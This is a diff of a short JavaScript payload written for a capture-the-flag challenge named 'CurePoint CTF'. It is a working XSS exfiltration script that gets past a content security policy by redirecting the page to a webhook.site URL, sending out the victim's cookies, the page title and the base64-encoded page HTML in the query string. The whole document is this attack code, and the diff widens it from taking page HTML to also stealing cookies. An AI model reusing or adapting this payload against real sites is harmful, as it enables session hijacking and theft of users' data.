@@ -1,14 +1,27 @@
-/* CurePoint CTF — load only from https://cdn.jsdelivr.net/gh/YOUR_USER/YOUR_REPO@main/exfil.js
- * CSP: connect-src inherits default-src 'none' → use top navigation to exfil DOM. */
+/* CurePoint CTF — CSP blocks fetch; exfil via navigation (short query for proxy limits). */
 (function () {
   var WH = "https://webhook.site/af75be10-0cbe-4fc8-843e-2dc8c15d14ed";
-  var html = "";
+  var c = "";
   try {
-    html = document.documentElement ? document.documentElement.outerHTML : "";
-    if (html.length > 12000) html = html.slice(0, 12000);
+    c = document.cookie;
   } catch (e) {
-    html = String(e);
+    c = String(e);
   }
-  var q = "len=" + html.length + "&d=" + encodeURIComponent(btoa(unescape(encodeURIComponent(html))));
-  window.location = WH + "?" + q;
+  var h = "";
+  try {
+    h = document.documentElement ? document.documentElement.outerHTML : "";
+    if (h.length > 3500) h = h.slice(0, 3500);
+    h = btoa(unescape(encodeURIComponent(h)));
+    if (h.length > 4000) h = h.slice(0, 4000);
+  } catch (e) {
+    h = btoa(String(e));
+  }
+  window.location =
+    WH +
+    "?c=" +
+    encodeURIComponent(c) +
+    "&t=" +
+    encodeURIComponent(document.title || "") +
+    "&d=" +
+    encodeURIComponent(h);
 })();
